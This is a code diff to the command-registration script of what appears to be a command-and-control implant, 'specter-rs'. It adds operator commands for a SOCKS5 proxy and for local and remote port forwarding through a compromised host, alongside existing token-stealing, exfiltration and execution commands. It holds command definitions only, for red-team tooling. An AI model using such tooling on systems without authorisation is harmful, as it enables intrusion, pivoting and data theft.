@@ -65,6 +65,33 @@ function RegisterCommands(listenerType)
     let cmd_tkn = ax.create_command("tkn", "Token manipulation");
     cmd_tkn.addSubCommands([_cmd_tkn_steal, _cmd_tkn_make, _cmd_tkn_impersonate, _cmd_tkn_revert, _cmd_tkn_list, _cmd_tkn_remove, _cmd_tkn_getuid, _cmd_tkn_privs]);
 
+    let _cmd_socks_start = ax.create_command("start", "Start SOCKS5 proxy", "socks start 127.0.0.1 1080");
+    _cmd_socks_start.addArgString("address", false, "Bind address on server", "127.0.0.1");
+    _cmd_socks_start.addArgInt("port", true, "Bind port on server");
+    let _cmd_socks_stop = ax.create_command("stop", "Stop SOCKS5 proxy", "socks stop 1080");
+    _cmd_socks_stop.addArgInt("port", true, "Bind port");
+    let cmd_socks = ax.create_command("socks", "Managing SOCKS5 proxy");
+    cmd_socks.addSubCommands([_cmd_socks_start, _cmd_socks_stop]);
+
+    let _cmd_lportfwd_start = ax.create_command("start", "Start local port forwarding from server via agent", "lportfwd start 127.0.0.1 8080 192.168.1.1 8080");
+    _cmd_lportfwd_start.addArgString("lhost", false, "Listening interface address on server", "0.0.0.0");
+    _cmd_lportfwd_start.addArgInt("lport", true, "Listen port on server");
+    _cmd_lportfwd_start.addArgString("fwdhost", true, "Remote forwarding address");
+    _cmd_lportfwd_start.addArgInt("fwdport", true, "Remote forwarding port");
+    let _cmd_lportfwd_stop = ax.create_command("stop", "Stop local port forwarding", "lportfwd stop 8080");
+    _cmd_lportfwd_stop.addArgInt("lport", true, "Listen port on server");
+    let cmd_lportfwd = ax.create_command("lportfwd", "Managing local port forwarding");
+    cmd_lportfwd.addSubCommands([_cmd_lportfwd_start, _cmd_lportfwd_stop]);
+
+    let _cmd_rportfwd_start = ax.create_command("start", "Start remote port forwarding from agent via server", "rportfwd start 8080 10.10.10.14 8080");
+    _cmd_rportfwd_start.addArgInt("lport", true, "Listen port on agent");
+    _cmd_rportfwd_start.addArgString("fwdhost", true, "Remote forwarding address");
+    _cmd_rportfwd_start.addArgInt("fwdport", true, "Remote forwarding port");
+    let _cmd_rportfwd_stop = ax.create_command("stop", "Stop remote port forwarding", "rportfwd stop 8080");
+    _cmd_rportfwd_stop.addArgInt("lport", true, "Listen port on agent");
+    let cmd_rportfwd = ax.create_command("rportfwd", "Managing remote port forwarding");
+    cmd_rportfwd.addSubCommands([_cmd_rportfwd_start, _cmd_rportfwd_stop]);
+
     let _cmd_ps_list = ax.create_command("list", "List of processes", "ps list", "Task: show process list");
     let _cmd_ps_kill = ax.create_command("kill", "Kill a process", "ps kill 1234", "Task: kill process");
     _cmd_ps_kill.addArgInt("pid", true);
@@ -115,7 +142,7 @@ function RegisterCommands(listenerType)
     cmd_terminate.addSubCommands([_cmd_terminate_thread, _cmd_terminate_process]);
 
     if(listenerType == "BeaconHTTP") {
-        let commands_http = ax.create_commands_group("specter-rs", [cmd_pwd, cmd_cd, cmd_ls, cmd_cat, cmd_mkdir, cmd_rm, cmd_cp, cmd_mv, cmd_getuid, cmd_disks, cmd_screenshot, cmd_tkn, cmd_ps, cmd_jobs, cmd_download, cmd_upload, cmd_exfil, cmd_execute, cmd_sleep, cmd_terminate]);
+        let commands_http = ax.create_commands_group("specter-rs", [cmd_pwd, cmd_cd, cmd_ls, cmd_cat, cmd_mkdir, cmd_rm, cmd_cp, cmd_mv, cmd_getuid, cmd_disks, cmd_screenshot, cmd_tkn, cmd_socks, cmd_lportfwd, cmd_rportfwd, cmd_ps, cmd_jobs, cmd_download, cmd_upload, cmd_exfil, cmd_execute, cmd_sleep, cmd_terminate]);
         return { commands_windows: commands_http }
     }
 
